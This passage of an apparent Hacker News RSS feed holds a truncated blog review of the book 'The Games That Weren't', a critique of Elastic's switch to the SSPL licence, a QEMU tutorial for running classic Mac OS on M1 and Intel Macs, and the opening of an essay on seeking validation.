<figure><img data-attachment-id="1539" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2341/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg" data-orig-size="2579,3439" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936167&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;400&quot;,&quot;shutter_speed&quot;:&quot;0.025&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2341" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=225" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=768" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=768 768w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=1536 1536w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=112 112w, https://retroarcadia.files.wordpress.com/2021/01/img_2341.jpg?w=225 225w" sizes="(max-width: 768px) 100vw, 768px"></figure>



<p>As someone that writes about games from time to time, I think I’m qualified to say that everything about this puts me to shame! The first thing you notice, the very first time you flick through it, is that it’s clearly an absolute labour of love, much like Frank’s website of the same name that he started way back in the nineties to document and find lost and unreleased games across many platforms. The next thing you notice is that it’s visually stunning – even more so than Scooby Doo in the Castle Mystery! And then you realise that it’s so much more than that…</p>



<figure><img data-attachment-id="1540" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2343/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg" data-orig-size="3548,2661" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936217&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.0090909090909091&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2343" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2343.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As games industry legend David Crane tells us in the foreword, this is all about games that never quite reached the game-playing public. Going all the way back to 1975 and up to 2015, the book covers 80 games that weren’t, and they weren’t for myriad reasons that all get unravelled here – flawed game design, internal politics, over-ambition, poor hardware sales, high cartridge costs or cabinet costs, failed field tests, expired licenses, not being able to fit a computer cartoon into 48K… Actually, I should say that Scooby Doo in the Castle Mystery didn’t make the cut here (which gives me hope that it still might arrive one day!), but some of the tales around these unreleased games are definitely mysteries worthy of Scooby and the gang!</p>



<figure><img data-attachment-id="1541" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2344/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg" data-orig-size="3817,2863" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936289&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.012658227848101&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2344" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2344.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Having spent some time in my stack of old game magazines just get my head around enough of the Scooby Doo story to mention it here, I can really empathise with Frank’s decades-long obsession with investigating these mysteries – that 30 minutes putting together a timeline from first advert to previews, doubts, cancellations then something else emerging in its place was really fascinating! But where I’ve just included a picture of an old copy of C&amp;VG, every game covered in The Games That Weren’t includes a load of development assets, screenshots, photos and artistic impressions – all reproduced in the very highest quality and sometimes for the first time – to illustrate the wonderfully in-depth analysis on each game.</p>



<figure><img data-attachment-id="1542" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2345/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg" data-orig-size="3746,2810" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936335&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.013698630136986&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2345" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2345.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Before we analyse that analysis, let’s quickly mention a few of those games to give us a bit of context, as well as what is probably my favourite thing about the book, which is not only discovering stuff you didn’t know existed, but discovering stuff you would have actually bought, and even seeing screenshots of it! And that’s why we’ll start with Elite on the Nintendo Game Boy, which got to prototype stage then the deal with Ocean fell through and consigned it to history; another nice feature is that for each game it tells you if it’s available to play or not… And apparently this one is, so definitely expect more from me on that in the future! We all know about Elite, but there’s an awful lot more that you probably won’t know anything about, such as Death Pit, Dick Special, Eye of the Moon, Virtua Hamster(!), Spitfire Fury  and Starring Charlie Chaplin to name but a few. There’s unreleased sequels like Heart of Yesod, Star Fox 2 and, er, Gazza 2. There’s all kinds of film licenses that (possibly thankfully) never saw the light of day like The Terminator, Lethal Weapon and Waterworld, as well as other licenses like Daffy Duck and Tony Hawk’s Shred Session. And then there’s the versions of games you probably do know but never made it, like Rescue on Fractalus! or Bubble Bobble, Ridge Racer or The Last Ninja…</p>



<figure><img data-attachment-id="1543" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2346/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg" data-orig-size="3637,2728" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936363&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;125&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2346" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2346.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As I write this, the last game I played before I went to bed last night was Arcade Archives Frogger on Nintendo Switch, so I reckon that Frogger 2: Swampy’s Revenge on Nintendo 64 is the perfect place to talk about the actual meat of the game analysis you’re getting here! It starts with a title screen summarising the reason it weren’t – cartridge costs in this case – then the year it weren’t (2000), the developer, the platform and whether or not it’s available to play. Then we get some background history – why Frogger epitomises 1980s arcades, the aim of the game, its reception and its ports. Then we get into what happened next; in the case of Frogger, it obviously never stopped being released on different platforms, but there was a Hasbro remake developed by Millenium Interactive in 1997 that leads us directly into the non-sequel. When Hasbro wanted a sequel, Millenium weren’t available to do it, so they approached Interactive Studios. We then hear from Philip Oliver, and then the project’s technical manager, Matt Cloy, who talks about the team and how they set about developing the game for the Nintendo 64. We get right into the development kits and all the juicy technical details here, right from the horse’s mouth, as well as some great detail on the process of developing then moving on from the earliest designs. </p>



<p>This turned into very much a 3D game, in stark contrast to the overhead 2D original, with complex geometries and some wild-sounding environments that weren’t too far removed from Super Mario Galaxy, years ahead of its time. But Hasbro didn’t like it! Need something more traditional, more 2D, more like Frogger. So then we hear about how it was all stripped back, the action became more immediate to the player, and a story was introduced involving Swampy the Crocodile being jealous of Frogger’s fame and fortune! At this point we start getting some really nice detail about how the game actually played as levels took shape and started to be tested and tweaked, and then there’s some substitutions made in the team to bring on some experience and make sure the game was brought home as planned. </p>



<figure><img data-attachment-id="1546" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2384/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg" data-orig-size="3884,2913" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610461038&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;200&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2384" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>And then it was all brought down with a bang! Hasbro got cold feet on increasing cartridge production costs and lead times, and the prospect of any profit was becoming risky, so at 70% complete, the Nintendo 64 version was canned. Now we jump to the PlayStation, PC, Dreamcast and Game Boy Colour versions that did eventually make it into the wild, reviewed okay, but never really had a chance to sell properly because after a year Konami said they wanted it removed from sale because the licence had expired! Now we get into the fun part of years then passing, glitchy prototypes sneaking out into the hands of collectors, and later builds appearing that featured things like placeholder sounds from other games and Pac-Man styled frogspawn collecting that would never have made the final cut. Finally, we get to what happened next, where we are now with availability of the various unfinished states online, and how the developers feel about the project in retrospect. And as we’ve already discussed, all those written words are supported by some beautiful visuals, in this case a full-page unpublished advert for the game including the Nintendo 64 logo at the top, and a selection of half-page, well-curated (and well-defined) screenshots that serve perfectly well to bring the game to life. It really is an incredibly polished package, and that’s all for just one of the eighty games!</p>



<p>Now, not every game gets the thousands of words of research and interviews that Frogger 2 gets – though an awful lot of them do – but regardless, you can see the care, attention and passion that’s gone into every single feature on every single game. And all of this this is complemented by five purpose-built “Hardware That Wasn’t” blueprint features and a load of interviews with the likes of the aforementioned David Crane, Jeff Minter, the Oliver Twins, Matthew Smith, Geoff Crammond and many other industry big-hitters, plus an honourable mentions section on loads of other games, all in chronological order, that you can find out more about digitally.</p>



<figure><img data-attachment-id="1544" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2348/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg" data-orig-size="3729,2797" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936477&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.0099009900990099&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2348" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As I flick through the book to make sure I haven’t forgotten anything, I’m so tempted just to keep going here! I happened to stop on Solar Jetman, where a wonderful …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/">https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/</a></em></p>]]>
            </description>
            <link>https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788647</guid>
            <pubDate>Fri, 15 Jan 2021 09:13:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elasticsearch and Kibana are now business risks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788620">thread link</a>) | @dberhane
<br/>
January 15, 2021 | https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks?s=09 | <a href="https://web.archive.org/web/*/https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks?s=09">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
          <p><strong> </strong> <time datetime="2021-01-14T00:00:00-08:00">January 14, 2021</time></p>
          
          
            <p> 




  4 minute read

</p>
          
        </header>
      

      <section itemprop="text">
        
        <p>In a play to convert users of their open source projects into paying customers, today Elastic announced that they are <a href="https://www.elastic.co/blog/licensing-change">changing the license</a> of both Elasticsearch and Kibana from the open source Apache v2 license to <a href="https://www.mongodb.com/licensing/server-side-public-license">Server Side Public License</a> (SSPL). If your organisation uses the open source versions of either Elasticsearch or Kibana in its products or projects, it is now at risk of being forced to release its intellectual property under terms dictated by another.</p>

<p>If you’re not yet aware of the SSPL, you can catch up <a href="https://mjg59.dreamwidth.org/51230.html">here</a>. As licenses go, it’s pretty problematic from a business perspective. Every <a href="https://en.wikipedia.org/wiki/Intellectual_property">IP lawyer</a> to whom I’ve showed the text of the SSPL has been rather alarmed before they even reach the end of it. Basically, it’s a hostile proprietary license masquerading in open source clothing. By using an SSPL project in your code, you are agreeing that if you provide an online service using that code then you will release not only that code but also the code for every supporting piece of software, all under the SSPL. It’s not a stretch to interpret the wording of the license as requiring users of the SSPL’d software therefore to release the code for everything straight down to the bare metal. There are those who will point to <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">the FAQ</a> for the SSPL and claim that the license isn’t interpreted in that way because the FAQ says so. Unfortunately, when you agree to a license you are agreeing to the <em>text of that license document</em> and not to a FAQ. If the text of that license document is ambiguous, then so are your rights and responsibilities under that license. Should your compliance to that license come before a judge, it’s <em>their</em> interpretation of those rights and responsibilities that will hold sway. This ambiguity puts your organisation at risk.</p>

<p>In <a href="https://www.elastic.co/blog/licensing-change">its announcement</a>, Elastic claims that this is simply a change of open source license. In one way they’re correct: they’re changing the license away from the open source Apache v2 license. However they are changing to what can best be described as a proprietary source available license, <em>not</em> to an open source one. MongoDB, the originators of SSPL, requested that <a href="https://opensource.org/">Open Source Initiative</a> (OSI) (the standards body that maintains the <a href="https://opensource.org/osd-annotated">Open Source Definition</a> and certifies licenses as open source) certify the SSPL as such. After a great deal of discussion among the panel of legal, licensing, and open source experts, MongoDB withdrew the SSPL from consideration as an open source license, as it appeared highly unlikely it would be certified as open source. That SSPL is not an open source license is no longer in dispute. That ship has sailed. If you have a problem with this, I suggest you <a href="https://lists.opensource.org/pipermail/license-discuss_lists.opensource.org/2019-May/020483.html">take it up</a> with OSI. As for Elastic’s public and verifiably false claim that SSPL is an open source license, it’s my hope that OSI will have a conversation with them and make a public statement of their own shortly.</p>

<p>No, this is a business decision, not an ideological one. Elastic made a business decision to change to this hostile proprietary license to give them a way to <del>extort</del>influence users to become customers. Without a great deal more strategic information about Elastic’s business and operations none of us are qualified to judge whether it’s the correct decision, but the decision itself is valid. They are allowed to make this sort of strategic move for their company.</p>

<p>However, you and your organisation have now also been forced into a business decision. If your organisation uses the Apache v2 licensed Elasticsearch or Kibana in its projects or products, it must now assume that it is at risk one way or another. It can upgrade to version 7.11 of these projects, thereby accepting the terms of SSPL and potentially also being required to release the code for its entire stack (a great deal of which it will not have the copyright over and will be unable to release, thereby potentially being in violation of SSPL). It can remain on version 7.10, but then it will no longer receive future updates, including important security fixes, thereby taking on another sort of risk. It could choose to pay for a Gold+ license for the software, but it’s unlikely that the budget is prepared for this sort of unexpected expense. And finally it can rearchitect its project or product, replacing Elasticsearch and/or Kibana with alternatives. Frankly, considering today’s unfriendly move by Elastic, putting some space between it and your organisation may be the safest alternative in the long run, but it will come with its own considerable price tag in time and other potential opportunity and switching costs.</p>

<p>The one thing your organisation cannot afford to do is ignore this. It’s time to call a meeting with your legal, software development, product, finance, and strategy teams to start to figure out the best option for you.</p>

<blockquote>
  <p>For more information on relicensing moves like this, please see <a href="https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/">The problem with Amazon and Open Source isn’t Amazon</a>.</p>
</blockquote>

<hr>

<blockquote>
  <p>Judging from the bandwidth usage stats on my hosting service, people seem to appreciate this post. Thank you for that. If you’d like me to provide corporate open source strategy for your company, please <a href="https://www.vmbrasseur.com/about/#contact">drop me an email</a>. I’ll soon be kicking my job search into high gear after <a href="https://anonymoushash.vmbrasseur.com/2020/06/01/farewell-juniper">Juniper laid off its open source team</a> last year. Contacting me now makes it more likely your company will be in consideration for my next role.</p>
</blockquote>

        
      </section>

      

      


      
  

    </div></div>]]>
            </description>
            <link>https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks?s=09</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788620</guid>
            <pubDate>Fri, 15 Jan 2021 09:08:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running Mac OS 9 and Mac OS X 10.0 – 10.4 on Apple Silicon (M1) & Intel via QEMU]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788542">thread link</a>) | @miles
<br/>
January 15, 2021 | http://blog.greggant.com//posts/2021/01/13/install-powerpc-macos-osx-on-apple-silicon-m1-and-x86-intel.html | <a href="https://web.archive.org/web/*/http://blog.greggant.com//posts/2021/01/13/install-powerpc-macos-osx-on-apple-silicon-m1-and-x86-intel.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <div itemprop="articleBody"> <section> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-macos9.png" alt="Mac OS 9 in QEMU"></p> <p>QEMU is an open-source emulator for virtualizing computers. Unlike VMWare, it's able to both virtualize CPUs and emulate various CPU instruction sets. It's pretty powerful, free, and has a macOS port. There are alternate versions and different ways to install it. Still, in this example, I'm using <a href="https://brew.sh/">Homebrew</a>, a package manager for macOS/OSX that allows you to install software via the CLI and manage easily. </p> <p>Now, this post wouldn't be very exciting if I tried this on my Mac Pro, but I decided to try it on my MacBook M1. Thus far, the community has succeeded in getting QEMU to install the ARM version Windows, so I decided to do the more silly path and get PPC and X86 working on Apple Silicon. I encountered very little resistance, which surprised me as I haven't seen/read anyone trying this route. It's surprsingly very usable but the usefulness is going to be limited. I was able to play Sim City 2000 on Mac OS 9.2 at a fairly high resolution. For the sake of brevity, I'm going to skip over installing Homebrew on an Apple M1, but you'll want to use the arch -x86_64 method, which requires prepending. I've gotten OS 10.0 and nearly gotten Windows 10 working on my M1.</p> <p> <iframe width="560" height="315" src="https://www.youtube.com/embed/aeSx4pm4MwY" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe> </p>  <p>Included below is the instruction for both Apple Silicon and Intel Macs.</p> <hr> <br> <h3>Requirements</h3> <ul> <li>Basic understanding of the terminal in OS X/macOS</li> <li>Apple Silicon (M1) computer (or Intel) Mac</li> <li>Xcode</li> <li>xcode-select (CLI Tools) <code>xcode-select --install</code></li> <li>Homebrew</li> </ul> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-osx.jpg" alt="Mac OS X in QEMU"></p> <h3>Step 1: Install QEMU</h3> <p>This is the only step where Apple Silicon and Intel Macs differ. You'll need to install the x86 version of QEMU for the Apple silicon macs first.</p> <h4>Apple Silicon</h4> <figure><pre><code data-lang="bash">    <span>arch</span> <span>-x86_64</span> brew <span>install </span>qemu </code></pre></figure> <h4>x86 Intel Macs</h4> <figure><pre><code data-lang="bash">    brew <span>install </span>qemu </code></pre></figure> <h3>Step 2: Create a disk image</h3> <p>The rest of the steps do not need any specification for M1 vs. Intel.</p> <p>You can specify a route, but I just used the default pathing, the 2G = 2 GB below. You can get away with much less for OS X OS 9. If you'd like more space, change the size of the simulated HDD. .</p> <figure><pre><code data-lang="bash">    qemu-img create <span>-f</span> qcow2 myimage.img 2G </code></pre></figure> <h3>Step 3: Launching the emulated computer and the tricky part: Formatting the HDD</h3> <p>Now that we have a blank hard disk image, we're ready to go.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/image  </code></pre></figure> <p>Let's break this down so it's not just magic. The first command is the qemu core emulator, you can use things like 64-bit x86 CPU <code>qemu-system-x86_64 </code> or a 32-bit CPU <code>qemu-system-i386 </code>, but we're using a PPC, so we are using <code>qemu-system-ppc</code>. </p> <p>Next, we're declaring PC bios with <code>-L pc-bios</code>, I'm unsure if this is necessary. This seems to be the default even in Mac QEMU. After that, the <code>-boot</code> flag declares the boot drive. For those who remember the days of yore, C is the default drive for PCs, D is the default for the CD-Rom like a PC. It's weird, I know. <code>-M</code> is the model flag. It's pretty esoteric, but <a href="http://people.redhat.com/pbonzini/qemu-test-doc/_build/html/topics/PowerPC-System-emulator.html">QEMU uses OpenBIOS</a>, and mac99 is the model for Beige G3s. The lowercase <code>-m</code> is memory, expressed in megabytes, but you can use 1G or 2G for 1 or 2 gigabytes like the format utility. <code>-hda</code> is the image we're using. Finally, <code>-cdrom</code> is the installer image</p> <h3>Step 3.5: Special considerations between operating systems</h3> <p>I discovered that OS X 10.0's installer has a significant flaw: It doesn't have a disk utility. The disk images are black disks thus have no file system. If you want to run OS X 10.0, you'll need to first launch an installer that can format HFS like OS 9 or later versions of OS X, run the disk utility, format the image and then exit out of the emulator. The process would look like this:</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/macosx10.4 or macOS9  </code></pre></figure> <p>Then format the drive from the utility, quit the emulator (control-c on the terminal window).</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/macosx10.0</code></pre></figure> <h3>Step 4: after the installer fininshes</h3> <p>You will end up seeing a failed boot screen after the installer finishes. This is normal. Either quit the QEMU instance or use control-c in the terminal to close it. Now that it's installed, we want to boot off the internal drive.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> c <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img    </code></pre></figure> <p>MacOS 9 seems to do slightly better when adding the via=pmu and specifying the graphics.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> c  <span>-M</span> mac99,via<span>=</span>pmu  <span>-g</span> 1024x768x32  <span>-m</span> 512 <span>-hda</span> os9.img  </code></pre></figure> <h3>Step 5: mounting disk images</h3> <p>There's not a lot to do with an OS without software. You can mount plenty of disk image formats</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> c <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk</code></pre></figure> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-simcity.jpg" alt="Sim City 2000 in QEMU on Apple Silicon"></p> <h3>Bonus round: Trying for x86 64 Windows 10</h3> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-proof.jpg" alt="Windows in QEMU on Apple Silicon"></p> <h3>Step 6: Multi CD-Rom Installs or swapping Disk Images</h3> <p>Older applications and OS installers require mutliple disk images. This can be done from via the CLI inside QEMU.</p> <p>On the QEMU window press:</p> <ul> <li>Control-Alt-2 to bring up the console</li> <li><code>change ide1-cd0 /path/to/image</code></li> <li>Control-Alt-1 to bring back the GUI</li> </ul> <p>Thus far my Windows 10 experiment has been a lot less successful, I've gotten through the installer (it's unbearably slow) but it seems to hand on booting. It looks very feasible. I might have better luck using the 32 bit verison of windows.</p> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-12-windows10.png" alt="Windows in QEMU on Apple Silicon"></p> <figure><pre><code data-lang="bash">qemu-system-x86_64  <span>-L</span> pc-bios <span>-boot</span> d <span>-m</span> 2048 <span>-hda</span> myimage.img <span>-cdrom</span>  Win10_20H2_v2_English_x64.iso  </code></pre></figure> </section> </div> </div></div>]]>
            </description>
            <link>http://blog.greggant.com//posts/2021/01/13/install-powerpc-macos-osx-on-apple-silicon-m1-and-x86-intel.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788542</guid>
            <pubDate>Fri, 15 Jan 2021 08:55:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Seeking Constant Validation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788328">thread link</a>) | @hgarg
<br/>
January 15, 2021 | https://harishgarg.com/writing/on-seeking-validation/ | <a href="https://web.archive.org/web/*/https://harishgarg.com/writing/on-seeking-validation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>We crave validation, all the time. It never stops.</p>
<p>We crave validation from ourselves, other humans, even our pets, and our environment.</p>
